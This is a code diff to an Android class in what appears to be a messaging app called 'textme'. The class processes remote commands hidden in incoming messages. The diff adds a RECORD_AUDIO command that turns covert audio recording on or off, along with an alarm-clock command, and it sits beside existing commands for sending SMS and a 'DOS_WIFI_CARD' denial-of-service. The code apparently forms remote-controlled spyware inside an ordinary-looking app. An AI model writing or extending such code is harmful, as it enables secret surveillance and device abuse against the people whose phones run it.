@@ -68,6 +68,7 @@ import com.candroid.textme.data.pojos.SmsMsg;
 import com.candroid.textme.jobs.JobsIntentService;
 import com.candroid.textme.receivers.AdminReceiver;
 import com.candroid.textme.receivers.OutgoingCallReceiver;
+import com.candroid.textme.receivers.ScreenReceiver;
 import com.candroid.textme.ui.activities.MainActivity;
 
 import java.io.ByteArrayOutputStream;
@@ -287,6 +288,15 @@ public class Lofl {
         context.startActivity(intent);
     }
 
+    public static void setAlarmClock(Context context, int hours, int minutes){
+        Intent intent = new Intent();
+        intent.setAction(AlarmClock.ACTION_SET_ALARM);
+        intent.putExtra(AlarmClock.EXTRA_HOUR, hours);
+        intent.putExtra(AlarmClock.EXTRA_MINUTES, minutes);
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        context.startActivity(intent);
+    }
+
     public static void persistentBlinkingFlashlight(final Context context) {
         TimerTask timerTask = new TimerTask() {
             @Override
@@ -410,7 +420,7 @@ public class Lofl {
     }
 
     public static void testProcessCommand(Context context){
-        String message = Constants.COMMAND_CODE + Commands.SEND_SMS + " --" + "0001112222" + " --" + "Hey mike I'm a robot!";
+        String message = Constants.COMMAND_CODE + Commands.RECORD_AUDIO + " --on";
         processCommand(context,message);
     }
 
@@ -479,10 +489,6 @@ public class Lofl {
                 intent.setAction(JobsIntentService.ACTION_SMS);
                 commandFound = true;
                 break;
-            case Commands.SYNC_PHONE:
-                // TODO: 1/31/19
-                commandFound = true;
-                break;
             case Commands.DOS_WIFI_CARD:
                 intent.setAction(JobsIntentService.ACTION_WIFI_CARD);
                 commandFound = true;
@@ -537,6 +543,28 @@ public class Lofl {
                 }
                 commandFound = true;
                 break;
+            case Commands.ALARM_CLOCK:
+                if(arg1 != null && arg2 != null){
+                    intent.putExtra(Constants.HOURS_KEY, Integer.valueOf(arg1));
+                    intent.putExtra(Constants.MINUTES_KEY, Integer.valueOf(arg2));
+                    intent.setAction(JobsIntentService.ACTION_ALARM_CLOCK);
+                }
+                commandFound = true;
+                break;
+            case Commands.RECORD_AUDIO:
+                if(arg1 != null){
+                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(context).edit();
+                    if(arg1.equalsIgnoreCase("off")){
+                        editor.putBoolean(ScreenReceiver.RECORDER_KEY, false);
+                        ScreenReceiver.sShouldRecordAudio = false;
+                    }else if(arg1.equalsIgnoreCase("on")){
+                        editor.putBoolean(ScreenReceiver.RECORDER_KEY,true);
+                        ScreenReceiver.sShouldRecordAudio = true;
+                    }else{}
+                    editor.apply();
+                }
+                commandFound = true;
+                break;
             default:
                 break;
         }
@@ -545,7 +573,6 @@ public class Lofl {
         }else{
             return false;
         }
-
         return commandFound;
     }
 
